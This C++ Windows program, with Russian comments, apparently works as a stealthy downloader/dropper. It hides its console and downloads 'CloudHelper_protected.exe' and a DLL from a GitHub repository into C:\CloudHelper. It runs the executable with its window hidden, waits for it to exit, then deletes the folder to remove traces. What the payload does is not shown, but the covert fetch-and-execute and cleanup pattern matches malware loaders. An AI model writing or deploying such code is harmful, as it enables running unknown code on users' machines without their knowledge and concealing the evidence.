#include <iostream>
#include <string>
#include <windows.h>
#include <wininet.h> // WinINet для HTTP-запросов
#include <direct.h>  // для _wmkdir
#include <shellapi.h> // для ShellExecute
#include <tlhelp32.h> // для работы с процессами

#pragma comment(lib, "wininet.lib")

using namespace std;

// Функция для создания папки, если она не существует
bool createDirectoryIfNotExists(const wstring& path) {
    if (_wmkdir(path.c_str()) == 0 || errno == EEXIST) {
        return true;
    }
    return false;
}

// Функция для скачивания файла по URL
bool downloadFile(const wstring& url, const wstring& outputPath) {
    HINTERNET hInternet = InternetOpen(L"Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }

    HINTERNET hUrl = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return false;
    }

    HANDLE hFile = CreateFile(outputPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[1024];
    DWORD bytesRead;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        DWORD bytesWritten;
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    }

    CloseHandle(hFile);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    return true;
}

// Функция для поиска процесса по имени
bool isProcessRunning(const wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (wstring(pe.szExeFile) == processName) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return false;
}

// Функция для удаления папки и её содержимого
bool deleteDirectory(const wstring& path) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((path + L"\\*").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return false;
    }

    do {
        wstring fileName = findFileData.cFileName;
        if (fileName != L"." && fileName != L"..") {
            wstring filePath = path + L"\\" + fileName;
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                deleteDirectory(filePath); // Рекурсивное удаление подпапок
            }
            else {
                DeleteFile(filePath.c_str()); // Удаление файлов
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
    return RemoveDirectory(path.c_str()) != 0;
}

int main() {
    // Отсоединяем консольное окно от процесса
    FreeConsole();

    // Путь к папке на диске C:
    wstring folderPath = L"C:\\CloudHelper";

    // Создаем папку, если она не существует
    if (!createDirectoryIfNotExists(folderPath)) {
        return 1;
    }

    // Ссылки на файлы для скачивания
    wstring url1 = L"https://github.com/DaniilWellnes/CloudHelper/raw/refs/heads/main/CloudHelper_protected.exe";
    wstring url2 = L"https://github.com/DaniilWellnes/CloudHelper/raw/refs/heads/main/Guna.UI.dll";

    // Пути для сохранения файлов
    wstring filePath1 = folderPath + L"\\CloudHelper_protected.exe";
    wstring filePath2 = folderPath + L"\\Guna.UI.dll";

    // Скачиваем первый файл
    if (!downloadFile(url1, filePath1)) {
        return 1;
    }

    // Скачиваем второй файл
    if (!downloadFile(url2, filePath2)) {
        return 1;
    }

    // Запускаем скачанный файл CloudHelper_protected.exe
    ShellExecute(NULL, L"open", filePath1.c_str(), NULL, NULL, SW_HIDE);

    // Ожидаем завершения процесса CloudHelper_protected.exe
    while (isProcessRunning(L"CloudHelper_protected.exe")) {
        Sleep(1000); // Проверяем каждую секунду
    }

    // Удаляем папку C:\CloudHelper после завершения процесса
    deleteDirectory(folderPath);

    return 0;
}